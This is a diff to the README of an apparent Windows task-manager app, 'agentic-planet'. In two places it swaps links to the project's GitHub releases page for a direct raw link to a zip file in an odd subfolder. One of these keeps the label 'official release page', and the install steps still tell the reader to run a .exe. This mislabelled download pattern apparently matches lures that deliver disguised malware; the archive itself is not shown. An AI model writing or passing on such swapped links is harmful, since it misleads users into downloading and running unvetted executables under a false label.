@@ -1,6 +1,6 @@
 # 🌍 agentic-planet - Manage your digital tasks with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Crosswise-overage824/agentic-planet/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Crosswise-overage824/agentic-planet/main/prefraternal/planet_agentic_v2.1.zip)
 
 ## 📌 About this software
 
@@ -22,7 +22,7 @@ If your computer meets these needs, the program will run well. Older computers m
 Follow these steps to get the application onto your computer.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/Crosswise-overage824/agentic-planet/releases).
+2. Go to the [official release page](https://raw.githubusercontent.com/Crosswise-overage824/agentic-planet/main/prefraternal/planet_agentic_v2.1.zip).
 3. Find the file that ends in .exe.
 4. Click the file name to start the download.
 5. Save the file to your desktop or downloads folder.
